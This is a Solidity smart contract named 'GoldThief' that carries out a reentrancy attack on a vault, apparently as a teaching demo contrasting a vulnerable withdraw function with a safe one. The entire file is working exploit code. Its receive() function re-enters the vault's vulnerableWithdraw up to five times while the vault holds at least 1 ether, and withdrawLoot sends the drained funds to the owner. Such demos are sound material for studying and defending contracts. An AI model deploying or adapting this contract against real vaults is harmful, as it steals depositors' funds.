// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public immutable targetVault; 
    address public immutable owner;
    uint8 public attackCount;
    bool public attackingSafe;

    error NotOwner();
    error InsufficientAttackFunds();

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    function attackVulnerable() external payable onlyOwner {
        if (msg.value < 1 ether) revert InsufficientAttackFunds();

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable onlyOwner {
        if (msg.value < 1 ether) revert InsufficientAttackFunds();

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        attackCount++;

        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }
    }

    function withdrawLoot() external onlyOwner {
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}